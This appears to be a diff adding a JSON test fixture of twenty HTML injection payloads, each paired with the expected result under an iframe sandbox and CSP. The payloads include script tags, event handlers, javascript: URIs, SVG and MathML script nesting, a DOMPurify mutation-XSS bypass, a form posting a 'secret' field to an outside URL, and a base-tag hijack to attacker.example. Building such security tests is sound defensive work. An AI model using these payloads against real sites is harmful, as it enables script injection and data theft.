@@ -1,0 +1,122 @@
+[
+  {
+    "id": "P01",
+    "name": "Inline script tag",
+    "html": "<script>document.title='PWNED-P01'</script><p>P01: inline script</p>",
+    "expected": "title unchanged, no script execution"
+  },
+  {
+    "id": "P02",
+    "name": "Inline onerror image",
+    "html": "<img src=x onerror=\"document.title='PWNED-P02'\"><p>P02: img onerror</p>",
+    "expected": "broken image renders, title unchanged"
+  },
+  {
+    "id": "P03",
+    "name": "Inline onclick anchor",
+    "html": "<a href='#' onclick=\"document.title='PWNED-P03'\">click P03</a>",
+    "expected": "anchor renders; click does nothing"
+  },
+  {
+    "id": "P04",
+    "name": "javascript: URI in href",
+    "html": "<a href=\"javascript:document.title='PWNED-P04'\">click P04</a>",
+    "expected": "click does nothing; no navigation"
+  },
+  {
+    "id": "P05",
+    "name": "data: URI script",
+    "html": "<iframe src=\"data:text/html,<script>top.document.title='PWNED-P05'</script>\"></iframe><p>P05: data URI</p>",
+    "expected": "nested iframe blocked by sandbox; outer title unchanged"
+  },
+  {
+    "id": "P06",
+    "name": "External script src",
+    "html": "<script src=\"https://example.com/x.js\"></script><p>P06: external script</p>",
+    "expected": "no network request; script tag inert"
+  },
+  {
+    "id": "P07",
+    "name": "External image src (resource load)",
+    "html": "<img src=\"https://example.com/tracker.png\"><p>P07: external img</p>",
+    "expected": "image blocked by CSP img-src"
+  },
+  {
+    "id": "P08",
+    "name": "Inline SVG with script",
+    "html": "<svg><script>document.title='PWNED-P08'</script></svg><p>P08: SVG script</p>",
+    "expected": "SVG renders, script blocked"
+  },
+  {
+    "id": "P09",
+    "name": "Form submission to external URL",
+    "html": "<form action=\"https://example.com/x\" method=\"POST\"><input name=secret value=stolen><button type=submit>P09</button></form>",
+    "expected": "form renders; submit blocked by sandbox (no allow-forms)"
+  },
+  {
+    "id": "P10",
+    "name": "iframe nested with allow-scripts",
+    "html": "<iframe sandbox=\"allow-scripts\" srcdoc=\"<script>top.document.title='PWNED-P10'</script>\"></iframe>",
+    "expected": "nested sandbox cannot escalate parent's sandbox; top.document inaccessible"
+  },
+  {
+    "id": "P11",
+    "name": "window.opener via target=_blank",
+    "html": "<a href=\"https://example.com\" target=\"_blank\">P11</a>",
+    "expected": "no popup (sandbox blocks allow-popups)"
+  },
+  {
+    "id": "P12",
+    "name": "meta refresh redirect",
+    "html": "<meta http-equiv=\"refresh\" content=\"0;url=https://example.com\"><p>P12</p>",
+    "expected": "no navigation (sandbox blocks top-navigation)"
+  },
+  {
+    "id": "P13",
+    "name": "CSS expression / -moz-binding",
+    "html": "<div style=\"background: url('javascript:document.title=PWNED-P13')\">P13</div>",
+    "expected": "style applied if any; no script execution (modern browsers reject)"
+  },
+  {
+    "id": "P14",
+    "name": "DOM clobbering via id=cookie",
+    "html": "<form id=\"cookie\"><input name=\"href\" value=\"hijacked\"></form><p>P14: DOM clobber</p>",
+    "expected": "renders; if outer page reads document.cookie, no cross-frame leak (sandbox blocks same-origin)"
+  },
+  {
+    "id": "P15",
+    "name": "<base> tag href hijack",
+    "html": "<base href=\"https://attacker.example/\"><a href=\"/login\">P15</a>",
+    "expected": "anchor renders with relative href; click blocked or navigates inside sandbox"
+  },
+  {
+    "id": "P16",
+    "name": "Embedded object/embed plugin",
+    "html": "<object data=\"data:text/html,<script>document.title='PWNED-P16'</script>\"></object>",
+    "expected": "object loads in nested context; script blocked"
+  },
+  {
+    "id": "P17",
+    "name": "Style tag with @import",
+    "html": "<style>@import url('https://example.com/evil.css');</style><p>P17</p>",
+    "expected": "@import blocked by CSP style-src"
+  },
+  {
+    "id": "P18",
+    "name": "SVG <foreignObject> with HTML",
+    "html": "<svg><foreignObject><div xmlns=\"http://www.w3.org/1999/xhtml\"><script>document.title='PWNED-P18'</script></div></foreignObject></svg>",
+    "expected": "foreignObject renders; nested script blocked"
+  },
+  {
+    "id": "P19",
+    "name": "MathML annotation-xml",
+    "html": "<math><annotation-xml encoding=\"text/html\"><script>document.title='PWNED-P19'</script></annotation-xml></math>",
+    "expected": "MathML renders; nested script blocked"
+  },
+  {
+    "id": "P20",
+    "name": "Mutation XSS via DOMPurify-bypass technique",
+    "html": "<noscript><p title=\"</noscript><img src=x onerror=document.title='PWNED-P20'>\">P20</p></noscript>",
+    "expected": "if DOMPurify is in the pipeline: sanitized; if iframe sandbox alone: no execution because sandbox blocks scripts regardless"
+  }
+]
